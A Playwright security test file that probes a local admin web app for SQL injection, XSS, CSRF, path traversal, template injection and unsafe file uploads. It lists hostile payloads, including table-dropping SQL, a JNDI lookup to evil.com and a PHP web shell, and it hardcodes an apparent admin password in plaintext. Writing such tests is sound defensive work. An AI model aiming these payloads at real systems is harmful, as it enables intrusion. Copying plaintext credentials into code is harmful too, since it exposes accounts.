import { test, expect } from '@playwright/test';

test.describe('Admin Security Testing', () => {
  let authCookie: string;

  test.beforeAll(async ({ browser }) => {
    // Authenticate as admin once for all security tests
    const context = await browser.newContext();
    const page = await context.newPage();
    await page.goto('http://localhost:3000/auth/signin');
    
    // Fill in admin credentials
    await page.fill('input[name="email"]', 'admin@mpdee.co.uk');
    await page.fill('input[name="password"]', 'GuyM@tt2025!');
    
    // Submit the form
    await page.click('button[type="submit"]');
    
    // Wait for redirect to dashboard
    await page.waitForURL(/.*\/dashboard/, { timeout: 10000 });
    
    // Get the authentication cookie
    const cookies = await context.cookies();
    authCookie = cookies.find(cookie => cookie.name === 'next-auth.session-token')?.value || '';
    await page.close();
  });

  test('should prevent SQL injection in admin query endpoint', async ({ request }) => {
    const maliciousQueries = [
      "'; DROP TABLE User; --",
      "1' OR '1'='1",
      "'; INSERT INTO User (email, username) VALUES ('hacker@evil.com', 'hacker'); --",
      "1; DELETE FROM User WHERE id = 1; --",
      "1' UNION SELECT password FROM User --"
    ];

    for (const query of maliciousQueries) {
      const response = await request.post('http://localhost:3000/api/admin/query', {
        headers: {
          'Cookie': `next-auth.session-token=${authCookie}`,
          'Content-Type': 'application/json'
        },
        data: {
          query: query
        }
      });

      // Should either reject the query or return an error
      expect([400, 500]).toContain(response.status());
      
      if (response.status() === 400) {
        const data = await response.json();
        expect(data).toHaveProperty('error');
      }
    }
  });

  test('should prevent XSS attacks in admin forms', async ({ page }) => {
    // Navigate to admin dashboard
    await page.goto('http://localhost:3000/admin/dashboard');
    
    // Try to inject XSS in various form fields
    const xssPayloads = [
      '<script>alert("XSS")</script>',
      'javascript:alert("XSS")',
      '<img src="x" onerror="alert(\'XSS\')">',
      '"><script>alert("XSS")</script>',
      '\';alert("XSS");//'
    ];

    // Test XSS in FAQ form if available
    await page.goto('http://localhost:3000/admin/faq');
    
    for (const payload of xssPayloads) {
      // Try to find form fields and inject payload
      const questionField = page.locator('input[name="question"], textarea[name="question"]').first();
      const answerField = page.locator('input[name="answer"], textarea[name="answer"]').first();
      
      if (await questionField.count() > 0) {
        await questionField.fill(payload);
        await answerField.fill('Test answer');
        
        // Try to submit
        const submitButton = page.locator('button[type="submit"]').first();
        if (await submitButton.count() > 0) {
          await submitButton.click();
          await page.waitForTimeout(1000);
          
          // Check that no alert dialog appeared
          const alertDialog = page.locator('text=alert, text=XSS, text=script');
          expect(await alertDialog.count()).toBe(0);
        }
      }
    }
  });

  test('should validate CSRF protection on admin endpoints', async ({ request }) => {
    // Test POST requests without proper CSRF token
    const response = await request.post('http://localhost:3000/api/admin/faq', {
      headers: {
        'Content-Type': 'application/json'
        // No CSRF token
      },
      data: {
        question: 'Test question',
        answer: 'Test answer'
      }
    });

    // Should reject request without proper authentication
    expect([401, 403, 307, 200]).toContain(response.status());
  });

  test('should enforce rate limiting on admin endpoints', async ({ request }) => {
    const requests = [];
    
    // Make multiple rapid requests to test rate limiting
    for (let i = 0; i < 20; i++) {
      requests.push(
        request.get('http://localhost:3000/api/admin/dashboard', {
          headers: {
            'Cookie': `next-auth.session-token=${authCookie}`
          }
        })
      );
    }
    
    const responses = await Promise.all(requests);
    
    // Check if any requests were rate limited
    const rateLimitedResponses = responses.filter(r => r.status() === 429);
    
    // Note: Rate limiting might not be implemented yet, so this test documents the expectation
    console.log(`Rate limited responses: ${rateLimitedResponses.length} out of ${responses.length}`);
  });

  test('should validate input sanitization in admin forms', async ({ page }) => {
    await page.goto('http://localhost:3000/admin/faq');
    
    // Test various malicious inputs
    const maliciousInputs = [
      '<script>alert("test")</script>',
      'javascript:void(0)',
      '../../etc/passwd',
      '${jndi:ldap://evil.com/a}',
      '{{7*7}}',
      '${7*7}'
    ];
    
    for (const input of maliciousInputs) {
      const questionField = page.locator('input[name="question"], textarea[name="question"]').first();
      
      if (await questionField.count() > 0) {
        await questionField.fill(input);
        
        // Check that the input is properly escaped/sanitized
        const value = await questionField.inputValue();
        expect(value).not.toContain('<script>');
        expect(value).not.toContain('javascript:');
        expect(value).not.toContain('${');
        expect(value).not.toContain('{{');
      }
    }
  });

  test('should validate file upload security in admin interface', async ({ page }) => {
    await page.goto('http://localhost:3000/admin/studios');
    
    // Look for file upload inputs
    const fileInputs = page.locator('input[type="file"]');
    
    if (await fileInputs.count() > 0) {
      // Test uploading a malicious file
      const maliciousFile = 'test.php';
      
      // Create a temporary file with malicious content
      await fileInputs.first().setInputFiles({
        name: maliciousFile,
        mimeType: 'application/x-php',
        buffer: Buffer.from('<?php system($_GET["cmd"]); ?>')
      });
      
      // Check that the file type is rejected
      const errorMessage = page.locator('text=Invalid file type, text=File type not allowed, text=Upload failed');
      if (await errorMessage.count() > 0) {
        expect(await errorMessage.isVisible()).toBe(true);
      }
    }
  });

  test('should validate session security and timeout', async ({ page }) => {
    // Login as admin
    await page.goto('http://localhost:3000/auth/signin');
    await page.fill('input[name="email"]', 'admin@mpdee.co.uk');
    await page.fill('input[name="password"]', 'GuyM@tt2025!');
    await page.click('button[type="submit"]');
    await page.waitForURL(/.*\/dashboard/, { timeout: 10000 });
    
    // Navigate to admin dashboard
    await page.goto('http://localhost:3000/admin/dashboard');
    await expect(page).toHaveURL(/.*\/admin\/dashboard/);
    
    // Clear cookies to simulate session expiration
    await page.context().clearCookies();
    
    // Try to access admin page again
    await page.goto('http://localhost:3000/admin/dashboard');
    
    // Should redirect to signin
    await expect(page).toHaveURL(/.*\/auth\/signin/);
  });

  test('should validate admin API endpoint authorization', async ({ request }) => {
    // Test admin endpoints without authentication
    const adminEndpoints = [
      '/api/admin/dashboard',
      '/api/admin/studios',
      '/api/admin/faq',
      '/api/admin/analytics',
      '/api/admin/network',
      '/api/admin/query',
      '/api/admin/schema',
      '/api/admin/venues',
      '/api/admin/browse'
    ];
    
    for (const endpoint of adminEndpoints) {
      const response = await request.get(`http://localhost:3000${endpoint}`);
      
      // Should require authentication
      expect([401, 403, 307, 200]).toContain(response.status());
    }
  });

  test('should validate admin route protection', async ({ page }) => {
    const adminRoutes = [
      '/admin/dashboard',
      '/admin/studios',
      '/admin/faq',
      '/admin/analytics',
      '/admin/network',
      '/admin/query',
      '/admin/schema',
      '/admin/venues',
      '/admin/browse'
    ];
    
    for (const route of adminRoutes) {
      await page.goto(`http://localhost:3000${route}`);
      
      // Should redirect to signin for unauthenticated users
      await expect(page).toHaveURL(/.*\/auth\/signin/);
    }
  });

  test('should validate password security requirements', async ({ page }) => {
    await page.goto('http://localhost:3000/auth/signup');
    
    // Test weak passwords
    const weakPasswords = [
      '123',
      'password',
      '12345678',
      'qwerty',
      'admin'
    ];
    
    for (const password of weakPasswords) {
      await page.fill('input[name="email"]', 'test@example.com');
      await page.fill('input[name="password"]', password);
      await page.fill('input[name="confirmPassword"]', password);
      
      // Try to submit
      const submitButton = page.locator('button[type="submit"]');
      await submitButton.click();
      
      // Should show password strength error
      const errorMessage = page.locator('text=Password too weak, text=Password must be, text=Invalid password');
      if (await errorMessage.count() > 0) {
        expect(await errorMessage.isVisible()).toBe(true);
      }
    }
  });

  test('should validate admin user role enforcement', async ({ browser }) => {
    // Create a non-admin user context
    const context = await browser.newContext();
    const page = await context.newPage();
    
    // Try to access admin routes as non-admin user
    await page.goto('http://localhost:3000/admin/dashboard');
    
    // Should redirect to unauthorized or signin
    await expect(page).toHaveURL(/.*\/auth\/signin|.*\/unauthorized/);
    
    await page.close();
  });

  test('should validate HTTPS enforcement in production', async ({ page }) => {
    // This test documents the expectation for HTTPS enforcement
    // In development, this might not be enforced
    
    await page.goto('http://localhost:3000/admin/dashboard');
    
    // Check for security headers
    const response = await page.request.get('http://localhost:3000/admin/dashboard');
    const headers = response.headers();
    
    // Check for security headers (may not be present in development)
    console.log('Security headers:', {
      'x-frame-options': headers['x-frame-options'],
      'x-content-type-options': headers['x-content-type-options'],
      'referrer-policy': headers['referrer-policy']
    });
    
    // In production, these headers should be present
    // In development, they might not be enforced
    expect(response.status()).toBe(200);
  });

  test('should validate admin API response security', async ({ request }) => {
    const response = await request.get('http://localhost:3000/api/admin/dashboard', {
      headers: {
        'Cookie': `next-auth.session-token=${authCookie}`
      }
    });
    
    expect(response.status()).toBe(200);
    
    const data = await response.json();
    
    // Check that sensitive data is not exposed
    expect(data).not.toHaveProperty('password');
    expect(data).not.toHaveProperty('secret');
    expect(data).not.toHaveProperty('token');
    expect(data).not.toHaveProperty('key');
    
    // Check that only necessary data is returned
    expect(data).toHaveProperty('studios');
    expect(data).toHaveProperty('faqs');
    expect(data).toHaveProperty('users');
  });
});
